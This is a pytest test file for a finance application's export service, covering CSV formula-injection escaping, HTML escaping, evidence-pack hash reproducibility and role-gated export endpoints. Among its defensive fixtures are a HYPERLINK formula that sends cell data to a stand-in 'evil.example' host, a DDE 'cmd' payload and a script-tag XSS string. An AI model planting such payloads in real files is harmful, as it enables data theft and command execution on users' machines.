"""Exports: the point at which data leaves the system.

Two things make an export either evidence or decoration, and both are silent
when wrong:

  * **A spreadsheet executes what you give it.** A vendor named `=HYPERLINK(…)`
    is a live formula in Excel, in a file the finance team opened precisely
    because it came from their own finance system.
  * **A hash has to be reproducible from the thing you are holding.** The pack
    hash seals the canonical JSON, not the rendered page. A document printing a
    hash nobody can recompute from it looks exactly like one that can.

The rest — column stability, which table a CSV carries — is the ordinary kind
of wrong, where somebody notices.
"""
import hashlib
import json
import re
import uuid
from datetime import date
from decimal import Decimal

import pytest

from app.core.enums import InvoiceState, UserRole
from app.models.invoice import Invoice
from app.services.export_service import (
    canonical_json, sanitize_cell, sha256_of, summary_of, tables_in, to_csv, to_html,
)

pytestmark = pytest.mark.integration


class TestSpreadsheetSafety:
    """CSV injection. The exported file is opened by an accountant who has
    every reason to trust it."""

    @pytest.mark.parametrize("payload", [
        "=1+1",
        "=HYPERLINK(\"http://evil.example/?\"&A1,\"Click\")",
        "+SUM(A1)",
        "-2+3",
        "@SUM(A1)",
    ])
    def test_a_formula_is_neutralised(self, payload):
        assert sanitize_cell(payload).startswith("'")

    def test_the_value_is_not_otherwise_altered(self):
        """Prefixed, not stripped or rewritten. Excel hides the apostrophe, so
        the cell still reads as what it was — an export that silently changed
        a vendor name would be a different kind of wrong."""
        assert sanitize_cell("=1+1") == "'=1+1"

    def test_ordinary_values_are_untouched(self):
        for value in ("Acme Ltd", "INV-2600", "1234.56", "N/A"):
            assert sanitize_cell(value) == value

    def test_a_negative_number_is_quoted_but_still_readable(self):
        """`-500` opens with a formula prefix, so it is escaped. That is
        deliberate: a spreadsheet reads `-500` as a number and `-500+cmd` as a
        formula, and the export cannot tell which one a free-text field holds.
        Amounts are numeric columns and never arrive here as text."""
        assert sanitize_cell("-500") == "'-500"

    def test_injection_survives_into_the_written_file(self):
        """The guard has to be in the writer, not only in the helper — a table
        assembled somewhere else must not be able to bypass it."""
        csv_text = to_csv(
            ["vendor", "amount"],
            [{"vendor": "=cmd|'/c calc'!A1", "amount": 100}],
        )

        assert "\n'=cmd" in csv_text or ",'=cmd" in csv_text or "'=cmd" in csv_text
        assert re.search(r"(^|,|\")=cmd", csv_text) is None


class TestCsvShape:
    def test_columns_follow_the_given_order(self):
        csv_text = to_csv(["b", "a"], [{"a": 1, "b": 2}])

        assert csv_text.splitlines()[0].endswith("b,a")

    def test_a_missing_key_leaves_an_empty_cell_not_a_shifted_row(self):
        """The failure this prevents is silent: one row missing an optional
        field shifts every later column by one, and the file looks like bad
        data rather than a bad export."""
        csv_text = to_csv(["a", "b", "c"], [{"a": 1, "c": 3}])

        assert csv_text.strip().splitlines()[-1] == "1,,3"

    def test_a_comma_or_quote_is_quoted_properly(self):
        csv_text = to_csv(["name"], [{"name": 'Acme, "Ltd"'}])

        assert '"Acme, ""Ltd"""' in csv_text

    def test_the_bom_is_present_for_excel(self):
        """Without it Excel on Windows reads UTF-8 as the local codepage and
        mangles every non-ASCII vendor name."""
        assert to_csv(["a"], [{"a": "Ünïcode"}]).startswith("﻿")


class TestFindingTheTables:
    def test_lists_of_dicts_become_tables(self):
        payload = {"total": 5, "blocked": [{"reason": "x", "count": 1}]}

        tables = tables_in(payload)

        assert list(tables) == ["blocked"]
        assert tables["blocked"][0] == ["reason", "count"]

    def test_columns_are_the_union_across_rows(self):
        """A row carrying an extra field must not lose it because row one
        lacked it."""
        payload = {"rows": [{"a": 1}, {"a": 2, "b": 3}]}

        columns, _ = tables_in(payload)["rows"]

        assert columns == ["a", "b"]

    def test_scalars_become_the_summary(self):
        payload = {"total_amount_stuck": 12.5, "paid": {"runs": 2, "amount": 9.0}}

        rows = summary_of(payload)

        assert {"measure": "total_amount_stuck", "value": 12.5} in rows
        assert {"measure": "paid.runs", "value": 2} in rows

    def test_a_list_of_scalars_is_not_a_table(self):
        assert tables_in({"notes": ["a", "b"]}) == {}


class TestTheDocument:
    def test_html_escapes_content(self):
        document = to_html(
            title="Report",
            sections=[("S", ["v"], [{"v": "<script>alert(1)</script>"}])],
        )

        assert "<script>alert(1)</script>" not in document
        assert "&lt;script&gt;" in document

    def test_nothing_is_fetched_from_outside(self):
        """An archive that phones home is not an archive: it renders
        differently in five years, or not at all, on a machine with no
        network."""
        document = to_html(title="R", sections=[("S", ["a"], [{"a": 1}])])

        assert "http://" not in document
        assert "https://" not in document
        assert "<link" not in document

    def test_an_embedded_bundle_cannot_close_its_own_script_block(self):
        """A string value containing `</script>` would end the block early and
        turn the rest of the bundle into markup — which corrupts exactly the
        bytes a reader is meant to re-hash."""
        bundle = json.dumps({"note": "</script><b>x"})

        document = to_html(
            title="R", sections=[], embedded_json=bundle,
        )

        assert "</script><b>" not in document
        assert document.count("</script>") == 1


class TestTheSealIsReproducible:
    """The property that makes the export evidence rather than decoration."""

    def test_the_canonical_form_is_stable_regardless_of_key_order(self):
        assert canonical_json({"b": 1, "a": 2}) == canonical_json({"a": 2, "b": 1})

    def test_the_service_and_the_exporter_agree(self):
        """Two copies of these arguments would drift — a changed separator in
        one place and every exported pack claims a hash that cannot be
        reproduced from it, with nothing failing to say so."""
        from app.services.evidence_pack import _canonical_hash

        payload = {"z": [1, {"a": None}], "a": "x"}

        assert _canonical_hash(payload) == sha256_of(canonical_json(payload))

    def test_the_hash_can_be_recomputed_from_the_embedded_bundle(self):
        """What a reader actually does: pull the script block out of the file
        they were given, hash it, compare. If this fails the document is
        decorative."""
        content = {"objects": [{"reference": "INV-1"}], "attachments": []}
        bundle = canonical_json(content)
        expected = sha256_of(bundle)

        document = to_html(
            title="Evidence pack",
            sections=[],
            meta={"pack_hash": expected},
            embedded_json=bundle,
        )

        extracted = re.search(
            r'<script type="application/json" id="canonical-bundle">(.*?)</script>',
            document, re.DOTALL,
        ).group(1).replace("<\\/", "</")

        assert hashlib.sha256(extracted.encode("utf-8")).hexdigest() == expected


def _invoice(db, tenant_id, created_by, number, vendor="Acme Ltd"):
    invoice = Invoice(
        id=uuid.uuid4(), tenant_id=tenant_id, invoice_number=number,
        vendor_name=vendor, invoice_date=date(2026, 8, 1),
        total_amount=Decimal("1000"), current_state=InvoiceState.PENDING_APPROVAL,
        created_by=created_by,
    )
    db.add(invoice)
    db.flush()
    return invoice


class TestTheEndpoints:
    def test_a_dashboard_exports_as_csv(self, db, tenant, client, as_user, make_user):
        admin = make_user(UserRole.ADMIN)
        _invoice(db, tenant.id, admin["id"], "INV-EXP-1")
        db.commit()
        as_user(admin)

        response = client.get("/api/v1/dashboard/control-room/export?format=csv")

        assert response.status_code == 200, response.text
        assert response.headers["content-type"].startswith("text/csv")
        assert "attachment; filename=" in response.headers["content-disposition"]
        assert response.text.startswith("﻿")

    def test_a_dashboard_exports_as_a_document(
        self, db, tenant, client, as_user, make_user
    ):
        admin = make_user(UserRole.ADMIN)
        _invoice(db, tenant.id, admin["id"], "INV-EXP-2")
        db.commit()
        as_user(admin)

        response = client.get("/api/v1/dashboard/control-room/export?format=html")

        assert response.status_code == 200, response.text
        assert "<!doctype html>" in response.text
        assert "Executive control room" in response.text

    def test_an_unknown_report_is_a_404_that_names_the_options(
        self, db, tenant, client, as_user, make_user
    ):
        as_user(make_user(UserRole.ADMIN))

        response = client.get("/api/v1/dashboard/not-a-report/export")

        assert response.status_code == 404
        assert "control-room" in response.json()["detail"]

    def test_an_unknown_table_is_refused_rather_than_silently_defaulted(
        self, db, tenant, client, as_user, make_user
    ):
        """Falling back to another table would hand somebody a file that is
        not what they asked for, with the right filename on it."""
        as_user(make_user(UserRole.ADMIN))

        response = client.get(
            "/api/v1/dashboard/control-room/export?format=csv&table=nope"
        )

        assert response.status_code == 404

    def test_every_report_exports(self, db, tenant, client, as_user, make_user):
        """All seven, because the export route reaches them by name and a
        renamed service method would only fail for the one it broke."""
        from app.api.dashboard_export import REPORTS

        as_user(make_user(UserRole.ADMIN))

        for report in REPORTS:
            response = client.get(f"/api/v1/dashboard/{report}/export?format=html")
            assert response.status_code == 200, f"{report}: {response.text[:200]}"

    @pytest.mark.parametrize("role", [
        UserRole.ADMIN, UserRole.CFO, UserRole.MANAGER,
        UserRole.AP_CLERK, UserRole.AUDITOR,
    ])
    def test_the_export_is_gated_exactly_like_the_screen(
        self, db, tenant, client, as_user, make_user, role
    ):
        """Not "an admin may export" — that would still allow a second gate
        that drifts. The file and the screen have to answer the same way for
        the same person, so the export can never become a way around a
        permission, and can never lock somebody out of a report they are
        already looking at.
        """
        as_user(make_user(role))

        screen = client.get("/api/v1/dashboard/policy-overrides")
        export = client.get("/api/v1/dashboard/policy-overrides/export")

        assert export.status_code == screen.status_code, (
            f"{role.value}: screen {screen.status_code}, export {export.status_code}"
        )


class TestTheEvidencePackExport:
    """The auditor's deliverable, end to end through the API."""

    @pytest.fixture(autouse=True)
    def _no_smtp(self, monkeypatch):
        from app.services.notification_service import NotificationService
        monkeypatch.setattr(NotificationService, "_deliver", lambda self, *a, **k: None)

    def _chain(self, db, tenant, user):
        """An invoice taken through create -> validate -> submit, which is the
        smallest thing with a real trail behind it."""
        from app.core.enums import VendorStatus
        from app.models.vendor import Vendor
        from app.schemas.invoice import InvoiceCreate
        from app.services.invoice_service import InvoiceService

        vendor = Vendor(
            id=uuid.uuid4(), tenant_id=tenant.id,
            legal_name=f"V-{uuid.uuid4().hex[:6]}",
            status=VendorStatus.ACTIVE, created_by=user["id"],
        )
        db.add(vendor)
        db.flush()

        service = InvoiceService(db)
        invoice = service.create_manual_invoice(
            InvoiceCreate(
                vendor_name="V", invoice_number=f"INV-{uuid.uuid4().hex[:6]}",
                vendor_id=vendor.id, invoice_date=date(2026, 1, 1),
                total_amount=100_000,
            ),
            user,
        )
        service.validate_invoice(invoice.id, user)
        service.submit_for_approval(invoice.id, user)
        db.commit()
        return invoice.correlation_id

    def test_the_pack_downloads_as_a_document(
        self, db, tenant, client, as_user, make_user
    ):
        admin = make_user(UserRole.ADMIN)
        correlation_id = self._chain(db, tenant, admin)
        as_user(admin)

        response = client.get(f"/api/v1/audit/evidence-pack/{correlation_id}/export")

        assert response.status_code == 200, response.text
        assert "attachment; filename=" in response.headers["content-disposition"]
        assert "Evidence pack" in response.text
        assert "Audit trail" in response.text

    def test_the_printed_hash_is_reproducible_from_the_downloaded_file(
        self, db, tenant, client, as_user, make_user
    ):
        """The whole claim, tested the way a reader would check it: take the
        file that was served, pull the canonical bundle out of it, hash it, and
        compare against the seal. A document whose hash cannot be reproduced
        from what you are holding is decoration.
        """
        admin = make_user(UserRole.ADMIN)
        correlation_id = self._chain(db, tenant, admin)
        as_user(admin)

        response = client.get(f"/api/v1/audit/evidence-pack/{correlation_id}/export")
        seal = response.headers["x-pack-sha256"]

        extracted = re.search(
            r'<script type="application/json" id="canonical-bundle">(.*?)</script>',
            response.text, re.DOTALL,
        ).group(1).replace("<\/", "</")

        assert hashlib.sha256(extracted.encode("utf-8")).hexdigest() == seal
        assert seal in response.text          # and it is printed on the page

    def test_the_json_export_carries_the_same_seal(
        self, db, tenant, client, as_user, make_user
    ):
        admin = make_user(UserRole.ADMIN)
        correlation_id = self._chain(db, tenant, admin)
        as_user(admin)

        html_response = client.get(
            f"/api/v1/audit/evidence-pack/{correlation_id}/export?format=html"
        )
        json_response = client.get(
            f"/api/v1/audit/evidence-pack/{correlation_id}/export?format=json"
        )

        assert json_response.status_code == 200
        assert json_response.headers["x-pack-sha256"] == html_response.headers["x-pack-sha256"]

    def test_exporting_does_not_seal_a_new_pack(
        self, db, tenant, client, as_user, make_user
    ):
        """Downloading a view is not generating evidence. A GET that recorded a
        pack would make every refresh a new audit event, and the register of
        packs would stop meaning anything."""
        from app.models.evidence_pack import EvidencePack

        admin = make_user(UserRole.ADMIN)
        correlation_id = self._chain(db, tenant, admin)
        as_user(admin)
        before = db.query(EvidencePack).count()

        client.get(f"/api/v1/audit/evidence-pack/{correlation_id}/export")

        assert db.query(EvidencePack).count() == before

    def test_an_empty_chain_is_refused_rather_than_certified(
        self, db, tenant, client, as_user, make_user
    ):
        """Same rule the sealing path already enforces: a document covering
        nothing, asserting everything verified, is worse than an error."""
        as_user(make_user(UserRole.ADMIN))

        response = client.get(
            f"/api/v1/audit/evidence-pack/{uuid.uuid4()}/export"
        )

        assert response.status_code == 404

    def test_a_clerk_cannot_export_an_evidence_pack(
        self, db, tenant, client, as_user, make_user
    ):
        """Evidence packs are audit-gated, unlike the dashboards."""
        admin = make_user(UserRole.ADMIN)
        correlation_id = self._chain(db, tenant, admin)
        as_user(make_user(UserRole.AP_CLERK))

        response = client.get(f"/api/v1/audit/evidence-pack/{correlation_id}/export")

        assert response.status_code == 403
